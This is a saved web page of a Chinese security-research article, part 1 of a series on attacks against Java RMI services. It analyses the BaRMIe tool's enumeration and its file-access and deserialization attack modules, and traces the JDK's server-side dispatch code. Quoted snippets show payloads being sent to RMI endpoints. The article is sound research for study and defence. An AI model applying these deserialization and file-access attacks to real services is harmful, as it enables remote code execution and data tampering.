+    <script src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/toc.min.js.下载"></script>
+    <script src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/dt.js.下载"></script>
+    
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span class="content-title ">针对RMI服务的九重攻击 - 上</span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="https://xz.aliyun.com/u/20851">
+                        <span class="username cell"> 啦啦0咯咯</span></a> <span class="i-seprator"> / </span>
+                    <span> 2020-07-01 09:40:24</span><span class="i-seprator"> / </span>
+                    <span>浏览数 15837</span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
+                            <a href="https://xz.aliyun.com/tab/1">安全技术</a></span>
+                        <span class="label label-default">
+                            <a href="https://xz.aliyun.com/node/1">漏洞分析</a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(7930);">
+             顶(5)</a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(7930);">
+             踩(0)</a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                <p>字数：1w6</p>
+<p>推荐阅读时间：&gt;2h</p>
+<h2 id="toc-0">前言</h2>
+<p>其实起因是听老哥讲<strong>"shiro-721可以用JRMP的payload，短很多，1分钟就可以跑出来"</strong>，啊！JRMP，RMI学过，我会的我会的.......实际上我会个锤子，YSO-JRMP的模块根本没用过。</p>
+<blockquote><p>但实际上本文只是顺道解决了这个问题的原理，如果只是想知道这个原理，可以到下篇的 JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener) 中去解答这个疑问，利用方式是同理的。</p>
+</blockquote>
+<p>然后有一天看了一波别人攻击RMI服务的工具，瞬间三观崩坏，打脸piapia响！</p>
+<p>于是.....花了按照月为单位的很长时间洋洋洒洒写了3w字的文整理了针对RMI服务的9种攻击方式，长文少有人能看下去，先丢上最终的研究的结果吧。（其实我感觉是不是应该去混议题的，算了资历尚浅，下次一定。死人脸）</p>
+<p><a id="img0" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200701101308-6810e0aa-bb40-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200701101308-6810e0aa-bb40-1.png"></a></p>
+<p>如果觉得有什么出入，喷就完事了；<br>
+同时觉得本文对你有帮助，<del>也请留言、评论、关注、一键三连支持你喜欢的up主！你的点赞是我更新的动力！如果这期点赞超过20w，下篇文章直播吃.....</del></p>
+<p>咳...同时由于文章实在过长，图片多达74张，将全文分为上、下两篇。</p>
+<p>在上篇中将讲述<strong>针对已知RMI接口的三种攻击方式</strong>与<strong>针对RMI层（RMI注册端、RMI服务端）/DGC层</strong>，是对已有常见利用方式的总结。</p>
+<p>而在下篇中将重点讲述<strong>绕过JEP290的引入JRMP的利用方式</strong>，这就很好玩了，指出了别的老哥的错误之处，找到了别人没提及的骚姿势，复现分析了老外的绕过方式。</p>
+<p>上下篇的小结论是沿用的，建议配合食用；文中实验代码、环境及工具均已上传<a href="https://github.com/lalajun/RMIDeserialize" target="_blank">github</a>。</p>
+<p>此外安利下<a href="https://github.com/wh1t3p1g/ysomap" target="_blank">ysomap</a>，如果没有意外的话，之后会陆续把这些攻击方式都移植过去（已经支持大部分攻击方式）。</p>
+<h2 id="toc-1">回顾稚嫩的过去</h2>
+<p>在学习了一整子之后回过头去看之前对于RMI的理解真是片面啊......<br>
+在 RMI 反序列化一文中，我们把RMI服务的攻击维度分成四个方向：</p>
+<ol>
+<li>探测利用开放的RMI服务</li>
+<li>基于RMI服务反序列化过程的攻击</li>
+<li>利用RMI的动态加载特性的攻击利用</li>
+<li>结合JNDI注入</li>
+</ol>
+<blockquote><p>我个人推荐把第一、第二方向与第三、第四个方向隔离开讨论与理解，第二个点是标准反序列化利用套路（readobject入口点+利用链+RCE）。同第一个一样都是针对RMI服务进行攻击，即打一个1099端口。</p>
+<p>而第三、第四个点则是想办法让对方服务器加载我们的恶意类，在对方服务器上实例化的时候执行恶意的构造函数或静态方法等（JNDI由于代码还可以执行另一个方法，这里不多说了）</p>
+<p><strong>我们在本文中只专注讨论剖析 探测利用开放的RMI服务、基于RMI服务反序列化过程的攻击</strong></p>
+</blockquote>
+<p>我们对于<strong>1.探测利用开放的RMI服务</strong>简单纸上谈兵了一下：可能存在可以利用的随便写入文件的类啦巴拉巴拉。</p>
+<p>同时简单复现了其中的<strong>2.基于RMI服务反序列化过程</strong>的攻击：</p>
+<p>在起一个有CC利用链（Commons-Collections）的RMI服务端之后，我们将服务端提供的服务的接口参数设置成Object类型（因为我们的payload就是Object对象）然后再拿这个object的payload去打提供服务的RMI服务端，成功。</p>
+<div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"rmi://127.0.0.1:1099/User"</span><span class="o">;</span>
+<span class="n">User</span> <span class="n">userClient</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span><span class="n">Naming</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+<span class="n">userClient</span><span class="o">.</span><span class="na">say</span><span class="o">(</span><span class="s">"world"</span><span class="o">);</span>
+<span class="n">userClient</span><span class="o">.</span><span class="na">dowork</span><span class="o">(</span><span class="n">getpayload</span><span class="o">());</span>
+<span class="c1">//dowaok接受一个Object函数，这时候我们传入恶意object会在对方服务器readobject反序列化</span>
+</pre></div>
+<p>于是那时候总结就是，如果RMI服务端可以被攻击成功需要：</p>
+<ol>
+<li>服务端提供一个RMI服务，提供的RMI服务的方法的参数必须为Object（因为我们的payload是Object）</li>
+<li>服务端有可以被利用的反序列化利用链及环境</li>
+</ol>
+<p>于是就觉得辣鸡漏洞，还需要对方提供一个Object的对象来把自己的payload对着这个Object点塞进去才行。实际情况咋可能，垃圾。</p>
+<p>实际上，对于之前讨论的：</p>
+<ol>
+<li>我们没有对探测利用开放的RMI服务进行进一步探究，到底是怎么探测的？</li>
+<li>RMI客户端打RMI服务端我们知道需要一个Object接口，但是我们是可以查询到这个接口是不是有Object参数，然后真的就条件这么苛刻，没有其他办法了么？</li>
+<li>之前的分析，完全忽略了<strong>RMI注册端</strong>的情况。</li>
+<li>之前的分析，完全片面理解了针对RMI服务的攻击，实际上还有很多利用方式和细节，简直管中窥豹。</li>
+<li>我们没有继续分析相应的利用工具的使用以及实现细节。</li>
+<li>我们没有继续分析在JDK版本更新中对于封堵的绕过情况</li>
+</ol>
+<p>这是一长串的一环套着一环的疑问，</p>
+<p>我们先来解决第一个问题 <strong>探测利用开放的RMI服务到底是个怎样攻击的流程</strong>。</p>
+<h2 id="toc-2">探测利用开放的RMI服务</h2>
+<p>之前我们讲到探测利用开放的RMI服务，使用工具<a href="https://github.com/NickstaDB/BaRMIe" target="_blank">BaRMIe</a>去寻找可受攻击的RMI服务，比如可能提供了文件上传等危险功能，一种就跟普通web测试差不多的很简单的感觉。</p>
+<p>但实际上我们要调用一个存在危险功能的RMI服务端需要知道：RMI对象<strong>a</strong>、方法<strong>b</strong>、参数<strong>c</strong>，即<code>a.b(c)</code></p>
+<p>自然会认为我们作为RMI客户端向RMI注册端查询有哪些RMI服务端，然后再去RMI服务端查询接口和参数，再根据返回的接口和参数，构造利用就好了。</p>
+<p>但是回忆一下在上一篇中讲述的RMI通讯流程，好像压根就没有RMI客户端向RMI服务端查询接口（方法和参数）的这一步骤，都是本地写一个一模一样的接口然后直接调用的。</p>
+<p>那么我们得不到方法和参数，实际上是不是根本就没有探测利用开放的RMI服务利用这么一说呢？</p>
+<p>我们来看<strong>BaRMIe工具</strong>是怎么做的。</p>
+<h3 id="toc-3">BaRMIe</h3>
+<p>先分析下这个工具——<a href="https://github.com/NickstaDB/BaRMIe" target="_blank">BaRMIe</a>。工具提供了两种利用模式——<code>enum</code>枚举模式，<code>attack</code>攻击模式。</p>
+<p>Github下载源码，然后Debug一下这个工具，idea使用<strong>listen to remote JVM</strong>的形式进行调试。</p>
+<p>idea端：</p>
+<p><a id="img1" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120352-62213410-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120352-62213410-b43d-1.png"></a></p>
+<p>源码处下断点，复制图中那个Command line，然后删掉&lt;&gt;可选，命令行运行比如：</p>
+<p><code>java -agentlib:jdwp=transport=dt_socket,server=n,address=LAPTOP-50N17D1J:5005,suspend=y -jar BaRMIe.jar -enum 127.0.0.1 1099</code></p>
+<p>就可以调试了。（复制过去是不行的因为address不一样）</p>
+<p>看enum枚举模式。入口在<code>nb.barmie.modes.enumeration.EnumerationTask#run</code></p>
+<p>代码不复杂就不大篇幅注解了，主要分为几步，直接总结下：</p>
+<p><strong>第一步</strong>：<code>ep = this._enumerator.enumerateEndpoint(this._target);</code></p>
+<p>作为RMI客户端向RMI注册端获取RMI服务端信息，这里叫做Endpoint，并分析Endpoint是RMI服务端</p>
+<ol>
+<li><code>LocateRegistry.getRegistry</code>获取目标IP端口的RMI注册端</li>
+<li><code>reg.list()</code>获取注册端上所有服务端的Endpoint对象</li>
+<li>使用<code>reg.unbind(unbindName);</code>解绑一个不存在的RMI服务名，根据报错信息来判断我们当前IP是否可以操控该RMI注册端（如果可以操控，意味着我们可以解绑任意已经存在RMI服务，但是这只是破坏，没有太大的意义，就算bind一个恶意的服务上去，调用它，也是在我们自己的机器上运行而不是RMI服务端）</li>
+<li>本地起一个代理用的RMI注册端，用于转发我们对于目标RMI注册端的请求（在RaRMIe中，通过这层代理用注册端可以变量成payload啥的，算是一层封装；在这里用于接受原始回应数据，再进行解析）</li>
+<li>通过代理服务器<code>reg.lookup(objectNames[i]);</code>遍历之前获取的所有服务端的Endpoint。</li>
+<li>通过代理服务器得到lookup返回的源数据，自行解析获取对应对象相应的类细节。（因为直接让他自动解析是不会有响应的类信息的）</li>
+</ol>
+<p>至此就获取了如下信息，可以看到会解析出RMI服务端的类名等等。</p>
+<p><a id="img2" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120406-6ab7fee2-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120406-6ab7fee2-b43d-1.png"></a></p>
+<p>如果这些信息都获取成功，就会判定为这个端口是一个注册端，否则觉得这个不是注册端，输出</p>
+<p><a id="img3" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120416-70a04332-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120416-70a04332-b43d-1.png"></a></p>
+<p>但是实际上你一个根本没开的端口扫描结果也会跟你说是一个RMI服务接口，随便看看就好了，相当于失败了。</p>
+<p><strong>第二步</strong>：<code>attacks = RMIAttackFactory.findAttacksForEndpoint(ep);</code>：</p>
+<p>对于所有Endpoint（RMI服务端）进行遍历，再一一调用攻击模块判断是否可以攻击。</p>
+<p>攻击模块如下：</p>
+<p><a id="img4" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120428-7802b6d2-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120428-7802b6d2-b43d-1.png"></a></p>
+<p>在看完代码后，我把他们根据攻击类型划分如下：</p>
+<ol>
+<li>RMI客户端探测利用RMI服务：</li>
+</ol>
+
+<pre><code>Axiom
+    -DeleteFile
+    -ListFiles
+    -ReadFile
+    -WriteFile</code></pre>
+<ol>
+<li>RMI客户端反序列化攻击RMI服务端——利用Object类型参数（RMI服务端提供的对象的方法参数有一个是Obejct类型）</li>
+</ol>
+
+<pre><code>Java
+    -JmxDeser
+SpringFramework
+    -RmiInvocationHandlerDeser
+    -Spring2RmilnvocationHandlerDeser</code></pre>
+<ol>
+<li>RMI服务端攻击RMI注册端——Bind类攻击</li>
+</ol>
+
+<pre><code>Java
+    -IllegalRegistryBind</code></pre>
+<p>以上当然这就有超出了探测利用RMI服务以外的类型，我们先划分出来。看看调用攻击模块之后做了什么，再回过头一个个分析攻击模块。</p>
+<p><strong>第三步</strong>：<code>deserPayloads = DeserPayloadFactory.findGadgetsForEndpoint(ep);</code></p>
+<p>对于所有Endpoint（RMI服务端）进行遍历，尝试判断是否存在反序列化利用链。</p>
+<ol>
+<li>其判断的原理大概是，判断RMI注册端提供的RMI服务端的对象class（如：com.lala.User）的路径中（不是非常确定？)，是否包含存在已知反序列化利用链的jar包。</li>
+</ol>
+<p>这是一个比较不靠谱的判断是否存在反序列化利用链的方法，反正我靶机中服务端有CC利用链，但是无法探测到。</p>
+<p>其中工具中已知反序列化利用链的jar包类别如下：</p>
+
+<pre><code>CommonsCollectionsPayload
+GroovyPayload
+JBossInterceptorsPayload
+ROMEPayload
+RhinoPayload</code></pre>
+<h3 id="toc-4">看看探测利用开放的RMI服务的攻击模块是怎么实现的</h3>
+<p>4个攻击模块Delete、List、Read、Write都是针对AxiomSL这个组件。看一个List的。</p>
+<p>描述：AxiomSL公开一个对象FileBrowserStub，它有一个list files（）方法，该方法返回给定目录中的文件列表。</p>
+<p>在判断是否存在漏洞时会去判断RMI服务返回的对象的class栈中是否存在以下class路径：</p>
+
+<pre><code>axiomsl.server.rmi.FileBrowserStub</code></pre>
+<p>判断存在该class路径后，再进行利用；实际利用代码也很简单，就是普通的RMI服务调用：</p>
+<div class="highlight"><pre><span></span><span class="c1">//nb.barmie.modes.attack.attacks.Axiom.ListFiles#executeAttack</span>
+<span class="kd">public</span> <span class="kt">void</span> <span class="nf">executeAttack</span><span class="o">(</span><span class="n">RMIEndpoint</span> <span class="n">ep</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">BaRMIeException</span> <span class="o">{</span>
+        <span class="c1">//一些参数设定    </span>
+
+        <span class="c1">//用户输入一个想要列出的文件目录</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">promptUserForInput</span><span class="o">(</span><span class="s">"Enter a path to list files from: "</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">""</span><span class="o">);</span>
+
+        <span class="c1">//向eq（RMI服务端）lookup一个FileBrowserStub对象</span>
+        <span class="c1">//同时本地也写好了FileBrowserStub接口</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[~] Getting fileBrowser object..."</span><span class="o">);</span>
+        <span class="n">fbs</span> <span class="o">=</span> <span class="o">(</span><span class="n">FileBrowserStub</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">getRemoteObject</span><span class="o">(</span><span class="n">ep</span><span class="o">,</span> <span class="s">"fileBrowser"</span><span class="o">);</span>
+
+        <span class="c1">//调用listFilesOnServer方法获取调用结果</span>
+        <span class="n">files</span> <span class="o">=</span> <span class="n">fbs</span><span class="o">.</span><span class="na">listFilesOnServer</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+
+    <span class="o">}</span>
+
+<span class="cm">/***********************************************************</span>
+<span class="cm"> * FileBrowserStub for AxiomSL attacks.</span>
+<span class="cm"> **********************************************************/</span>
+<span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">interface</span> <span class="nc">FileBrowserStub</span> <span class="kd">extends</span> <span class="n">Remote</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">abstract</span> <span class="n">FileInformation</span><span class="o">[]</span> <span class="nf">listFilesOnServer</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">abstract</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">readFile</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">,</span> <span class="kt">long</span> <span class="n">paramLong</span><span class="o">,</span> <span class="kt">int</span> <span class="n">paramInt</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">abstract</span> <span class="kt">void</span> <span class="nf">writeFile</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">paramArrayOfByte</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">abstract</span> <span class="kt">boolean</span> <span class="nf">deleteFile</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">paramBoolean</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">abstract</span> <span class="n">FileInformation</span> <span class="nf">getFileInformation</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></div>
+<p>那这边也就清楚了，实际上探测利用开放的RMI服务，根本只是攻击者自己知道有哪些组件会提供危险的RMI服务。然后根据class路径去判断对面是否使用了该组件，如果用了就尝试打一打看看成不成功。</p>
+<p>假如对面提供了我们一个不认识的RMI服务，我们是没有能力攻击的。</p>
+<p>就如之前提到的一样：因为我们没有RMI服务对象的接口（方法+参数）。就算对面开放了一个Class名字可疑的服务，我们也没有办法去正确调用它。</p>
+<p>可见这种理论存在但是不怎么被人讨论的攻击方法总是有些鸡肋。</p>
+<h2 id="toc-5">RMI客户端反序列化攻击RMI服务端</h2>
+<p>那么再看之前的工具中的第二类攻击形式——RMI客户端反序列化攻击RMI服务端</p>
+<h3 id="toc-6">利用Object类型参数</h3>
+<p>3个攻击模块都是利用有Object类型参数的接口，来传入Object类型的payload，在RMI服务端对Object类型的参数进行反序列化时，触发payload来完成反序列化攻击的。</p>
+
+<pre><code>Java
+    -JmxDeser
+SpringFramework
+    -RmiInvocationHandlerDeser
+    -Spring2RmilnvocationHandlerDeser</code></pre>
+<p>这三个攻击模块同样是针对特定的组件提供的RMI服务，在判断是否存在漏洞时，代码会去判断RMI服务返回的对象的class栈是否存在以下class路径：</p>
+
+<pre><code>javax.management.remote.rmi.RMIServerImpl_Stub
+javax.management.remote.rmi.RMIServer
+org.springframework.remoting.rmi.RmiInvocationWrapper_Stub
+org.springframework.remoting.rmi.RmiInvocationHandler</code></pre>
+<p><strong>利用Object类型参数</strong>跟探测利用开放的RMI服务一样，也是假如对面自实现了RMI服务，我们没有接口的话就两眼摸黑，无法下手。</p>
+<p>还是继续看看BaRMIe是怎么攻击的，以Spring RMI服务为例。</p>
+<p>描述：Spring RMI Remoting使用invoke（）方法公开一个远程类，该方法接受一个RemoteInvocation对象作为参数。RemoteInvocation对象有一个可以保存任何对象的属性，从而启用反序列化攻击。</p>
+<div class="highlight"><pre><span></span><span class="c1">//nb.barmie.modes.attack.attacks.Java.JMXDeser#executeAttack    </span>
+<span class="kd">public</span> <span class="kt">void</span> <span class="nf">executeAttack</span><span class="o">(</span><span class="n">RMIEndpoint</span> <span class="n">ep</span><span class="o">,</span> <span class="n">DeserPayload</span> <span class="n">payload</span><span class="o">,</span> <span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">BaRMIeException</span> <span class="o">{</span>
+        <span class="n">RMIServer</span> <span class="n">obj</span><span class="o">;</span>
+        <span class="c1">//eq是RMI服务</span>
+        <span class="c1">//payload是选取的payload种类</span>
+        <span class="c1">//cmd是我们要在目标执行的命令</span>
+        <span class="c1">//开始攻击</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//建立代理rmi服务，等会我们去看看内部做了什么</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"\n[~] Getting proxied jmxrmi object..."</span><span class="o">);</span>
+            <span class="n">obj</span> <span class="o">=</span> <span class="o">(</span><span class="n">RMIServer</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">getProxiedObject</span><span class="o">(</span><span class="n">ep</span><span class="o">,</span> <span class="s">"jmxrmi"</span><span class="o">,</span> <span class="n">payload</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="n">cmd</span><span class="o">,</span> <span class="mi">0</span><span class="o">));</span>
+
+            <span class="c1">//调用newClient()方法,传入一个固定默认的object</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[+] Retrieved, invoking newClient(PAYLOAD)..."</span><span class="o">);</span>
+            <span class="n">obj</span><span class="o">.</span><span class="na">newClient</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">DEFAULT_MARKER_OBJECT</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+            <span class="c1">//Check the exception for useful info</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">checkDeserException</span><span class="o">(</span><span class="n">ex</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>跟进this.getProxiedObject</p>
+<p><code>nb.barmie.modes.attack.RMIDeserAttack#getProxiedObject(nb.barmie.modes.enumeration.RMIEndpoint, java.lang.String, byte[])</code>:</p>
+<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="kd">final</span> <span class="n">Object</span> <span class="nf">getProxiedObject</span><span class="o">(</span><span class="n">RMIEndpoint</span> <span class="n">ep</span><span class="o">,</span> <span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">payload</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">BaRMIeException</span> <span class="o">{</span>
+    <span class="c1">//需要注意此处的this.DEFAULT_MARKER_OBJECT_BYTES</span>
+    <span class="c1">//与obj.newClient(this.DEFAULT_MARKER_OBJECT)中的内容一致，等同于一个占位符的感觉</span>
+    <span class="c1">//这边是从ep（rmi服务端）端中获取了名字为name的对象，做代理</span>
+    <span class="c1">//同时在代理之后所有的通讯的同时，会将this.DEFAULT_MARKER_OBJECT_BYTES替换为payload</span>
+    <span class="c1">//从而实现不同的payload的动态注入</span>
+    <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">getProxiedObject</span><span class="o">(</span><span class="n">ep</span><span class="o">,</span> <span class="n">name</span><span class="o">,</span> <span class="n">payload</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">DEFAULT_MARKER_OBJECT_BYTES</span><span class="o">);</span>
+<span class="o">}</span>
+</pre></div>
+<p>可以看到实际利用就是直接去服务端lookup获取这个<strong>jmxrmi</strong>对象，获取到了就调用<strong>newClient(Object a)</strong>这个方法，然后用自己的payload替换这个a就可以了。</p>
+<p>与我们预想中的一样，也不是啥rmi服务都能打的。如果不知道对面接口、参数，对方那又不存在自己已知的用Object参数的rmi服务接口（class判断），就直接GG。</p>
+<p>同样局限很大，但是相对于探测利用开放的RMI服务，这个稍微要求低点，不要求对方功能有害，只要有一个已知有Object参数的方法接口就行。但是，这里作为一个反序列化点，要利用，还需要服务器有利用链才行。</p>
+<h4>漏洞触发点</h4>
+<p>我们之前默认了这个Object参数肯定会在服务端反序列化，虽然事实也是如此，但是我们来看一下到底在服务端是如何反序列化的。这将对我们接下来的漏洞理解有帮助，毕竟之后都是看源码。</p>
+<blockquote><p>github：RMI-Client Client 攻击 RMI-Server ServerAndRegister 【没用BaRMIe打是因为，那边的环境比较复杂，自己写个参数简单点】</p>
+<p>jdk:1.7u80【这边使用的CC payload是1.7下的】</p>
+<p>反序列化链：cc3.2.1</p>
+</blockquote>
+<p>服务端在下面的dispatch方法中下断点，开启调试，客户端直接运行攻击服务端，就会到断点处</p>
+<p><code>rt.jar.sun.rmi.server.UnicastServerRef#dispatch</code></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">dispatch</span><span class="o">(</span><span class="n">Remote</span> <span class="n">var1</span><span class="o">,</span> <span class="n">RemoteCall</span> <span class="n">var2</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="kt">long</span> <span class="n">var4</span><span class="o">;</span>
+        <span class="n">ObjectInput</span> <span class="n">var40</span><span class="o">;</span>
+        <span class="c1">//---------第一个try--------</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">var40</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+            <span class="kt">int</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">var40</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">var3</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+                <span class="c1">//在正式接受参数前解析前，会进入几次这个if函数，虽然不知道干了啥，估计是一些固定通讯</span>
+                <span class="c1">//但是在接受参数，进行解析执行参数的dispatch，不会进入这个if</span>
+                <span class="c1">//所以第一个try这里其实没做什么，就在下main读取了一个Method hash</span>
+                <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">skel</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">this</span><span class="o">.</span><span class="na">oldDispatch</span><span class="o">(</span><span class="n">var1</span><span class="o">,</span> <span class="n">var2</span><span class="o">,</span> <span class="n">var3</span><span class="o">);</span>
+                    <span class="k">return</span><span class="o">;</span>
+                <span class="o">}</span>
+
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"skeleton class not found but required for client version"</span><span class="o">);</span>
+            <span class="o">}</span>
+           <span class="c1">//var4是从客户端传输过来的序列化数据中读取客户端调用的Method hash</span>
+            <span class="n">var4</span> <span class="o">=</span> <span class="n">var40</span><span class="o">.</span><span class="na">readLong</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var36</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling call header"</span><span class="o">,</span> <span class="n">var36</span><span class="o">);</span>
+        <span class="o">}</span>
+       <span class="c1">//--------第一个try结束---------</span>
+        <span class="n">MarshalInputStream</span> <span class="n">var39</span> <span class="o">=</span> <span class="o">(</span><span class="n">MarshalInputStream</span><span class="o">)</span><span class="n">var40</span><span class="o">;</span>
+        <span class="n">var39</span><span class="o">.</span><span class="na">skipDefaultResolveClass</span><span class="o">();</span>
+        <span class="c1">//通过客户端提供的var4去验证客户端想要调用的方法，在这里有没有</span>
+        <span class="n">Method</span> <span class="n">var8</span> <span class="o">=</span> <span class="o">(</span><span class="n">Method</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">hashToMethod_Map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var4</span><span class="o">);</span>
+        <span class="c1">//如果没有就报错你想调用的方法在这里不存在。</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">var8</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"unrecognized method hash: method not supported by remote object"</span><span class="o">);</span>
+        <span class="o">}</span>
+</pre></div>
+<p>来看看这边服务端的hashToMethod_Map长啥样，就是我们在服务端实现的RMI服务对象的三个方法。</p>
+<p><a id="img5" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120455-87b633ec-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120455-87b633ec-b43d-1.png"></a></p>
+<p><strong>之前开过一个脑洞</strong>：</p>
+<p>正常而言是服务端什么接口，客户端就用什么接口，比如<code>name(java.lang.String)</code></p>
+<p>如果我们在客户端强行把<code>name(java.lang.String)</code>的方法接口写成<code>name(java.lang.Object)</code>（因为在客户端，RMI接口类是客户端自己写的，如果把name参数故意写成Object，在客户端调用是不会报错的），尝试无中生有一个Object来让服务端解析，如果这样成功的话，就可以这样是不是就扩大了攻击面了，不是Object的参数就创造一个Object参数出来，让服务端解析？</p>
+<p>但是实际上看过源码我们也会发现，会卡死在上面method hash验证这一步的，会报错：<strong>unrecognized method hash</strong></p>
+<p><a id="img6" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120505-8e2abdb0-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120505-8e2abdb0-b43d-1.png"></a></p>
+<p>虽然我们知道不行，还是看看具体数据包，打开wireshark，抓个RMI客户端发送参数给RMI服务端的数据包（关于抓包交互流程啥的参考上一篇RMI 反序列化吧，个人是抓的Npcap网卡，无线网卡抓不到本地交互包）：</p>
+<p><a id="img7" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120518-95b483cc-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120518-95b483cc-b43d-1.png"></a></p>
+<p>导出为16进制字符串，把aced反序列化开头前的不要，给serializationdumper分析一下，图中框起来的就是我们客户端传输的method hash</p>
